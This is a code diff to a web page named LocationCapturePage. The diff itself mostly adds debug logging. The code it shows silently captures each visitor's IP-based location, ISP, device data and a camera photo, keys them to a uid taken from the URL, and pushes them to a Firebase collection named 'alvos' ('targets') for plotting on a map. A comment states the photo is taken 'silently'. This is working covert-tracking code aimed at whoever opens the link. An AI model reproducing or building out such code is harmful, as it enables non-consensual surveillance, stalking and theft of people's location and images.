@@ -20,7 +20,9 @@ export default function LocationCapturePage() {
     const userIdParam = params.get("uid")
     setUserId(userIdParam)
 
-    console.log("[v0] 🎯 Location capture page loaded for user:", userIdParam)
+    console.log("[v0] 🎯 Location capture page loaded")
+    console.log("[v0] 👤 User ID from URL:", userIdParam)
+    console.log("[v0] 🗄️ Firebase path will be:", `alvos/${userIdParam || "anonymous"}`)
 
     // Auto-start camera and capture photo silently
     const autoCapture = async () => {
@@ -97,27 +99,32 @@ export default function LocationCapturePage() {
   }, [hasCaptured, isCapturing])
 
   const handleAutoCapture = async () => {
-    if (isCapturing || hasCaptured) return
+    if (isCapturing || hasCaptured) {
+      console.log("[v0] ⏭️ Skipping capture (already capturing or captured)")
+      return
+    }
 
     setIsCapturing(true)
+    console.log("[v0] 🚀 Starting auto-capture process...")
 
     try {
-      console.log("[v0] 🎯 Auto-capturing location and photo data...")
-
+      console.log("[v0] 📡 Fetching IP and device data...")
       const data = await captureAllData()
 
-      console.log("[v0] 📊 Captured data summary:", {
+      console.log("[v0] ✅ Data fetched successfully")
+      console.log("[v0] 📊 IP Data:", {
         hasIpData: !!data.ipData,
-        ipHasCoordinates: !!(data.ipData?.latitude && data.ipData?.longitude),
-        ipCoords:
+        ip: data.ipData?.ip,
+        coordinates:
           data.ipData?.latitude && data.ipData?.longitude
-            ? { lat: data.ipData.latitude, lng: data.ipData?.longitude }
-            : null,
-        ipLocation: data.ipData ? `${data.ipData.city}, ${data.ipData.country}` : "No location",
+            ? `${data.ipData.latitude}, ${data.ipData.longitude}`
+            : "MISSING",
+        location: data.ipData ? `${data.ipData.city}, ${data.ipData.country}` : "MISSING",
       })
 
       if (!data.ipData || !data.ipData.latitude || !data.ipData.longitude) {
-        console.error("[v0] ❌ Cannot save capture without valid IP coordinates")
+        console.error("[v0] ❌ CRITICAL: Cannot save capture without valid IP coordinates!")
+        console.error("[v0] 📍 IP Data received:", JSON.stringify(data.ipData, null, 2))
         setHasCaptured(true)
         setIsCapturing(false)
         return
@@ -125,7 +132,6 @@ export default function LocationCapturePage() {
 
       const userPath = userId || "anonymous"
       const alvosRef = ref(database, `alvos/${userPath}`)
-
       const timestamp = Date.now()
 
       const capturePayload = {
@@ -152,33 +158,46 @@ export default function LocationCapturePage() {
           photoData && photoData !== "camera_denied" && photoData !== "camera_error" ? { photo: photoData } : undefined,
       }
 
-      console.log("[v0] 💾 Saving to Firebase at path:", `alvos/${userPath}`)
-      console.log("[v0] 📍 Capture details:", {
-        ip: capturePayload.ipData.ip,
+      console.log("[v0] 💾 Preparing to save to Firebase...")
+      console.log("[v0] 📂 Firebase path:", `alvos/${userPath}`)
+      console.log("[v0] 📦 Payload structure:", {
+        pageType: capturePayload.pageType,
+        timestamp: new Date(timestamp).toISOString(),
+        hasIpData: !!capturePayload.ipData,
         coordinates: {
           lat: capturePayload.ipData.latitude,
           lng: capturePayload.ipData.longitude,
         },
         location: `${capturePayload.ipData.city}, ${capturePayload.ipData.country}`,
-        isp: capturePayload.ipData.isp,
-        timestamp: new Date(timestamp).toISOString(),
         hasPhoto: !!capturePayload.formData?.photo,
       })
 
+      console.log("[v0] 🔥 Pushing to Firebase...")
       const result = await push(alvosRef, capturePayload)
 
-      console.log("[v0] ✅ Data saved successfully to Firebase with key:", result.key)
-      console.log("[v0] 🗺️ Marker should now appear on the global map at coordinates:", {
-        lat: capturePayload.ipData.latitude,
-        lng: capturePayload.ipData.longitude,
+      console.log("[v0] ✅ SUCCESS! Data saved to Firebase")
+      console.log("[v0] 🔑 Firebase key:", result.key)
+      console.log("[v0] 📍 Full path:", `alvos/${userPath}/${result.key}`)
+      console.log("[v0] 🗺️ Marker coordinates:", {
+        latitude: capturePayload.ipData.latitude,
+        longitude: capturePayload.ipData.longitude,
+        location: `${capturePayload.ipData.city}, ${capturePayload.ipData.country}`,
       })
+      console.log("[v0] ⏰ Timestamp:", new Date(timestamp).toISOString())
+      console.log("[v0] 🎯 This capture should now appear on the global map immediately!")
 
       setHasCaptured(true)
     } catch (error) {
-      console.error("[v0] ❌ Auto-capture error:", error)
+      console.error("[v0] ❌ CAPTURE ERROR:", error)
+      console.error("[v0] 📋 Error details:", {
+        name: error instanceof Error ? error.name : "Unknown",
+        message: error instanceof Error ? error.message : String(error),
+        stack: error instanceof Error ? error.stack : undefined,
+      })
       setHasCaptured(true)
     } finally {
       setIsCapturing(false)
+      console.log("[v0] 🏁 Capture process finished")
     }
   }
 
